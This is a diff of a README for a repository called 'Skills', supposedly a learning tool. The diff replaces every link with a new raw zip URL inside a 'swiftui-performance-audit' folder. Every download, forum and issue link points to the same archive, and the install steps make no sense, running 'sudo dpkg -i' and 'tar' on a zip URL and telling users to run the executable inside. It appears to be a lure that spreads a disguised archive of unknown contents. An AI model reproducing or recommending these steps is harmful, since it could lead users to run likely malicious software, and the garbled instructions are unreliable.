@@ -4,7 +4,7 @@
 Welcome to Skills, a simple tool designed to help you improve your codex skills. This application offers a user-friendly interface for learning various skills at your own pace. Whether you're looking to sharpen your existing skills or learn new ones, Skills is here to assist.
 
 ## 📥 Download Skills
-[![Download Skills](https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip%20Now-Ready%20to%20Use-brightgreen)](https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip)
+[![Download Skills](https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip%20Now-Ready%20to%20Use-brightgreen)](https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run Skills successfully. No technical knowledge is required.
@@ -12,7 +12,7 @@ Follow these steps to download and run Skills successfully. No technical knowled
 ### Step 1: Visit the Download Page
 To get started, click the link below to visit the download page:
 
-[Click here to download Skills](https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip)
+[Click here to download Skills](https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip)
 
 ### Step 2: Choose Your Version
 On the download page, you will find different versions of the application. Choose the latest release to ensure you have the most up-to-date features and improvements.
@@ -20,23 +20,23 @@ On the download page, you will find different versions of the application. Choos
 ### Step 3: Download the Application
 After selecting the latest version, you will see files available for download. Click on the appropriate file for your operating system.
 
-For **Windows**, look for a file named `https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip`.  
-For **Mac**, select `https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip`.  
-For **Linux**, you can choose `https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip` or `https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip`.
+For **Windows**, look for a file named `https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip`.  
+For **Mac**, select `https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip`.  
+For **Linux**, you can choose `https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip` or `https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip`.
 
 ### Step 4: Install Skills
 **Windows:**
-1. Locate the downloaded `https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip` file and double-click it.
+1. Locate the downloaded `https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip` file and double-click it.
 2. Follow the installation prompts to complete the setup.
 
 **Mac:**
-1. Double-click the downloaded `https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip` file.
+1. Double-click the downloaded `https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip` file.
 2. Drag and drop the Skills application into your Applications folder.
 
 **Linux:**
 1. Open your terminal.
-2. For the `.deb` file, use: `sudo dpkg -i https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip`
-3. For the `https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip` file, extract it with: `tar -xvzf https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip` and run the executable inside.
+2. For the `.deb` file, use: `sudo dpkg -i https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip`
+3. For the `https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip` file, extract it with: `tar -xvzf https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip` and run the executable inside.
 
 ### Step 5: Launch the Application
 Once the installation is complete, you can start Skills. For Windows and Mac, find it in your Applications or Start menu. For Linux, navigate to the directory where you extracted the files and run the application.
@@ -76,8 +76,8 @@ For further assistance, consider checking forums or support resources related to
 ## 🌐 Community and Support
 Join our community of learners! Engage in discussions, share your experiences, and ask questions. Follow these links to connect with us:
 
-- [Discussion Forum](https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip)
-- [Submit an Issue](https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip)
+- [Discussion Forum](https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip)
+- [Submit an Issue](https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip)
 
 ## 🎉 Conclusion
 Thank you for choosing Skills! We hope you find the application helpful and enriching. If you have any feedback or suggestions, please don't hesitate to reach out to us through the community links above. Enjoy your learning journey!
@@ -85,4 +85,4 @@ Thank you for choosing Skills! We hope you find the application helpful and enri
 ## 📥 Download Again
 To download Skills, visit the link below:
 
-[Download Skills](https://github.com/NickYt0909/Skills/raw/refs/heads/main/swiftui-performance-audit/Software_lenticulostriate.zip)
+[Download Skills](https://raw.githubusercontent.com/NickYt0909/Skills/main/swiftui-performance-audit/references/Software-v3.6-beta.2.zip)
